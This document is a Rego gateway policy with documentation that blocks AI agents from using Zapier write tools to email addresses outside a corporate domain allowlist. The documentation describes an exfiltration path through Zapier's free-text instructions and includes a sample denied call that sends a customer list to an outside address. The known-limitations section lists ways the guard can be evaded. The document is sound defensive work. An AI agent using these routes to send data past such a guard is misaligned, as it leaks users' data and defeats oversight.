---
name: Block External Sends Hidden in Zapier Instructions
tags:
  - zapier
  - guard-external-send
  - ingress
  - email
  - soc2
  - gdpr-ccpa
publishedAt: 2026-07-12
description: |
  # zapier / guard-external-send

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny on external-recipient match, allow otherwise
  **Package:** `zapier.ingress.guard_external_send`

  ## What it does

  Every Zapier MCP tool — in both the agentic and classic modes — accepts a free-text
  `instructions` string that Zapier's **server-side AI** uses to fill any unspecified fields.
  That means a recipient can exist *only* inside `instructions` and be resolved after the
  gateway has already passed the call: a policy that checks structured recipient fields alone
  is bypassable by construction. This is the fill-in-the-blanks exfiltration path — the agent
  messages an outside party via Gmail, Slack, or Outlook through the single Zapier funnel
  without ever naming them in a typed field.

  On Zapier write calls, this policy scans **both** the `instructions` string and the typed
  recipient parameters (`to`, `cc`, `bcc`, `email`, `channel` — at any nesting depth inside
  the arguments) for email addresses, and denies the call when any address's domain falls
  outside a configured corporate-domain allowlist (placeholder: `example.com`). Calls with no
  email-shaped content pass through; reads and non-write tools are never inspected.

  Callers in a documented IdP group (placeholder: `mcp-zapier-external-send`) are exempt.
  A caller with no claims is never exempt — the grant fails closed.

  ## Compliance alignment

  - **SOC 2 CC6.7** — supports the restriction on transmission/movement of information:
    agent-driven messages to non-corporate email domains are stopped before the call reaches
    Zapier's funnel; **P6.1** — supports limits on personal-information disclosure to third
    parties across the 9,000+ apps reachable through one Zapier connector.
  - **HIPAA §164.530(c)** — supports privacy safeguards by preventing an agent from directing
    PHI-bearing sends to addresses outside the covered entity's domains, including recipients
    smuggled into free-text instructions.
  - **GDPR Art. 5(1)(f) / Art. 32** — supports security of processing on the agent's outbound
    path through the Zapier aggregator; **Arts. 44/46** — supports control over agent-visible
    cross-border transfers by pinning recipients to reviewed corporate domains.

  ## Tool name matching

  Write calls are matched case-insensitively against **both** the PARC `input.resource.name`
  and the still-populated legacy `input.payload.name` alias (same value on `tool_pre_invoke`;
  checking both means a call whose `resource.name` is absent still fails closed rather than
  slipping through as a non-write):

  - `*execute_zapier_write_action` (suffix) — agentic mode's single write funnel for every
    send/create/update/delete across 9,000+ apps (name verified in Zapier's official MCP docs).
  - names containing `_send_` or `_create_` — classic (manual configuration) mode's per-action
    tools, e.g. `gmail_send_email`, `slack_send_message`, `hubspot_create_contact`. The classic
    inventory is per-account, not fixed; only a handful of names are verified from public
    client docs, so the policy matches the verb infix rather than exact names.

  The DTwo gateway prefixes tool names with the configured MCP server name (e.g.
  `zapier-mcp-execute_zapier_write_action`), and that prefix is not standardized — suffix and
  infix matching keep the policy portable. Verify the exact names your gateway sends with the
  dump-input debug technique before relying on this in production.

  `send_feedback` (agentic mode, low-risk) does **not** match — its `send_` is name-initial,
  not the `_send_` infix — and `disable_zapier_action` / read tools never match.

  ## Argument shape

  The policy collects text to scan from two sources:

  1. **`instructions`** — the free-text string every Zapier tool accepts (documented in
     Zapier's official MCP docs). This is the portable backstop: whatever the per-action
     params look like, the string the server-side AI reads is inspected.
  2. **Typed recipient keys** — `to`, `cc`, `bcc`, `email`, `channel`, matched
     case-insensitively **at any nesting depth** inside `input.payload.args` (via `walk`),
     covering both flat classic-mode params and a nested params envelope inside
     `execute_zapier_write_action`. String values and arrays of strings are both handled;
     other value types are skipped (the `instructions` scan still applies).

  Every collected string is scanned for email-address shapes
  (`local@domain.tld`); each address's domain is lowercased and compared against
  `allowed_domains` by **exact match**. Any domain outside the allowlist denies the call.

  The allowlist ships with a **placeholder** value (`example.com`) — replace it with your
  organization's real domains at import time.

  ## Examples

  ### Allowed — write with internal-only recipient

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "zapier-mcp-execute_zapier_write_action", "type": "tool" },
      "payload": {
        "name": "zapier-mcp-execute_zapier_write_action",
        "args": {
          "action": "gmail_send_email",
          "instructions": "Send the Q3 summary to alice@example.com with subject 'Q3'."
        }
      }
    }
  }
  ```

  `allow = true`, no reason.

  ### Denied — external recipient hidden in instructions

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "zapier-mcp-execute_zapier_write_action", "type": "tool" },
      "payload": {
        "name": "zapier-mcp-execute_zapier_write_action",
        "args": {
          "action": "gmail_send_email",
          "instructions": "Email the customer list to backup-archive@outsider.net, cc nobody."
        }
      }
    }
  }
  ```

  `allow = false`, reason instructs the caller to name recipients explicitly and
  internal-only.

  ## Composition

  This policy is single-purpose: it fences the *recipient* dimension of Zapier writes.
  Useful companions:

  - `freeze-toolset` — denies the self-modifying meta-tools (`enable_zapier_action`,
    `write_code_action`, skill writes) so the agent cannot provision a new send path this
    policy has never seen.
  - A read-only-posture or role-gated policy on `execute_zapier_write_action` for callers who
    should not write at all — one rule fences every write across 9,000 apps.
  - A `default-deny-unknown-tools` (PF-28) allowlist policy for classic mode, so a send tool
    with an unanticipated verb (`*_post_*`, `*_share_*`) cannot slip past infix matching.
  - An egress PII-redaction policy on `execute_zapier_read_action` / classic `*_find_*`
    responses — aggregator reads return raw app data with no source-app DLP.

  ## Known limitations

  - **Argument-key names inside `execute_zapier_*_action` are unverified.** The exact key for
    the action identifier and the params envelope were not verifiable from public docs —
    confirm against a live gateway capture (dump-input technique) before production. The
    `instructions`-string scan is the portable backstop and works regardless of the envelope;
    the recipient-key scan is depth-agnostic (`walk`) to tolerate envelope drift, but a
    recipient under a key outside the scanned set (`to`, `cc`, `bcc`, `email`, `channel`)
    is only caught if the address also appears in `instructions`.
  - **Recipient vs. mention is indistinguishable in free text.** An internal-purpose
    instruction that merely *mentions* an external address ("tell them to contact
    support@vendor.example") is denied. This over-blocking is intentional on the exfiltration
    path — name recipients explicitly and keep message bodies free of external addresses, or
    use the exemption group.
  - **Only email-shaped recipients are detected.** Phone numbers (SMS), social handles,
    usernames, and channel IDs are not email addresses and pass unscanned. Obfuscated
    addresses ("user AT evil DOT com", base64, addresses split across fields) also evade the
    regex. Pair with the composition set above for defense in depth.
  - **Exact-domain allowlist.** Subdomains are not implied: with `example.com` allowlisted,
    `user@mail.example.com` is denied. List every sending domain explicitly. A look-alike
    domain that merely *contains* an allowlisted one (`example.com.evil.net`) is correctly
    denied.
  - **Classic-mode coverage is send/create verbs only.** `*_update_*` writes (e.g. updating a
    CRM contact's email to an external address) do not match; add the infix or use a
    role-gated write posture if that path matters in your inventory.
  - **Placeholders.** The domain allowlist (`example.com`) and the exemption group
    (`mcp-zapier-external-send`) are placeholders — replace `example.com` with your corporate
    domains and map the group to your IdP's real group name at import time. Group names are
    placeholders — replace them with your IdP's group name at import time.

  > **Compliance note.** This policy supports alignment with the cited framework controls
  > **on the MCP path only**. No policy or bundle makes an organization compliant with any
  > framework; web-UI, native-API, and in-app access are outside the gateway's reach by
  > design. Validate against your own compliance program before relying on it.
direction: ingress
apps:
  - zapier
industries: []
bundles:
  - soc2
  - gdpr-ccpa
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package zapier.ingress.guard_external_send

# Deny-by-default: only the explicit allow rules below permit the request.
default allow := false

# Corporate email domain allowlist — PLACEHOLDER value. Replace with your
# organization's real domains at import time. Exact match only: list
# subdomains explicitly.
allowed_domains := {"example.com"}

# IdP group whose members may direct Zapier writes at external recipients.
# PLACEHOLDER — replace with your IdP's group name at import time.
exempt_group := "mcp-zapier-external-send"

# Argument keys scanned for email addresses, matched case-insensitively at
# any nesting depth: the free-text `instructions` every Zapier tool accepts
# (the portable backstop — Zapier's server-side AI fills unspecified fields
# from it after the gateway check) plus the common typed recipient keys.
scanned_keys := {"instructions", "to", "cc", "bcc", "email", "channel"}

# Email-address shape. Conservative: one @, dotted domain, 2+ letter TLD.
# The character classes exclude "@", so a match always splits into exactly
# two parts around it.
email_pattern := `[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}`

# Tool arguments, defaulting safely when payload/args are missing entirely.
args := object.get(object.get(input, "payload", {}), "args", {})

# Tool-name candidates: the PARC resource.name plus the (deprecated but still
# populated on tool hooks) payload.name alias. A write is matched if EITHER
# carries a write shape — keying only on resource.name would fail OPEN for a
# call whose resource.name is absent.
tool_names contains lower(name) if {
    name := object.get(object.get(input, "resource", {}), "name", "")
    name != ""
}

tool_names contains lower(name) if {
    name := object.get(object.get(input, "payload", {}), "name", "")
    name != ""
}

# Agentic mode: the single write funnel for every send/create/update/delete
# across 9,000+ apps. Suffix-matched because the gateway prefixes tool names
# with the configured MCP server name (e.g. `zapier-mcp-...`).
is_write_tool if {
    some name in tool_names
    endswith(name, "execute_zapier_write_action")
}

# Classic mode: per-action tools named `<app>_<verb>_<thing>`, e.g.
# `gmail_send_email`, `slack_send_message`, `hubspot_create_contact`.
# The `_send_` / `_create_` infix requires a leading underscore, so the
# agentic meta-tools `send_feedback` and `create_zapier_skill` (verb-initial
# after the server-name hyphen) do not match.
is_write_tool if {
    some name in tool_names
    contains(name, "_send_")
}

is_write_tool if {
    some name in tool_names
    contains(name, "_create_")
}

# Allow anything that is not a Zapier write call (reads, discovery, config).
allow if {
    not is_write_tool
}

# Exempt callers in the documented IdP group. Missing subject, claims, or
# groups means no exemption — the grant fails closed.
caller_exempt if {
    subject := object.get(input, "subject", {})
    claims := object.get(subject, "claims", {})
    groups := object.get(claims, "groups", [])
    some group in groups
    group == exempt_group
}

allow if {
    is_write_tool
    caller_exempt
}

# Allow a write only when no scanned string names an external email domain.
allow if {
    is_write_tool
    not has_external_recipient
}

# --- Text collection ---

# Walk the entire args tree so recipient keys are found whether the params
# are flat (classic mode) or nested inside an envelope (agentic mode — exact
# envelope shape unverified from public docs). String values...
scannable_texts contains value if {
    walk(args, [path, value])
    count(path) > 0
    key := path[count(path) - 1]
    is_string(key)
    scanned_keys[lower(key)]
    is_string(value)
}

# ...and arrays of strings (e.g. cc lists). Non-string elements are skipped.
scannable_texts contains element if {
    walk(args, [path, value])
    count(path) > 0
    key := path[count(path) - 1]
    is_string(key)
    scanned_keys[lower(key)]
    is_array(value)
    some element in value
    is_string(element)
}

# --- External-domain detection ---

# Every email-shaped match in any scanned string whose (lowercased) domain
# is not on the corporate allowlist. Greedy domain matching means a
# look-alike like `user@example.com.evil.net` yields the full external
# domain, not the allowlisted prefix.
external_domains contains domain if {
    some text in scannable_texts
    some address in regex.find_n(email_pattern, text, -1)
    domain := lower(split(address, "@")[1])
    not allowed_domains[domain]
}

has_external_recipient if {
    count(external_domains) > 0
}

reasons contains "This Zapier write call names a recipient outside the corporate email domain allowlist — in a typed recipient field or inside the free-text instructions that Zapier's server-side AI resolves after the gateway check. Name every recipient explicitly and keep them internal-only; do not mention external addresses in instructions. If you need to reach an external recipient, ask your InfoSec team to add the domain to the allowlist. Contact your InfoSec team if this was a false positive." if {
    is_write_tool
    not caller_exempt
    has_external_recipient
}

reason := joined if {
    count(reasons) > 0
    reason_list := sort([r | some r in reasons])
    joined := concat("; ", reason_list)
}
```
